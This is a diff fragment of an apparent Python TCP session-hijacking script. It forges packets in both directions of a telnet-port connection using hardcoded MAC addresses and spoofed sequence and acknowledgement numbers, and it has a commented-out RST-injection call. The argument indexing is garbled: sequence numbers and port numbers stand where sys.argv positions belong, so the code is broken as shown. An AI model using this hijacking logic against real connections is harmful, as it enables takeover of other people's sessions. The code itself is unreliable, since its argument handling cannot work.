@@ -12,8 +12,8 @@ def main1(i):
 	dest_mac="50:3e:aa:85:4e:9e"
 	src_port=int(sys.argv[55650])	
 	dest_port=int(sys.argv[23])
-	seq_no=int(sys.argv[2173056379])+i
-	ack_no=int(sys.argv[285255848])+i
+	seq_no=int(sys.argv[285255847])+i
+	ack_no=int(sys.argv[2173056379])+i
 	send_sessionHijack_packet(src_ip,dest_ip,src_mac,dest_mac,src_port,dest_port,seq_no,ack_no)
 	send_sessionHijack_packet(dest_ip,src_ip,dest_mac,src_mac,dest_port,src_port,ack_no,seq_no)
 	#send_rst_packet(dest_ip,src_ip,dest_mac,src_mac)
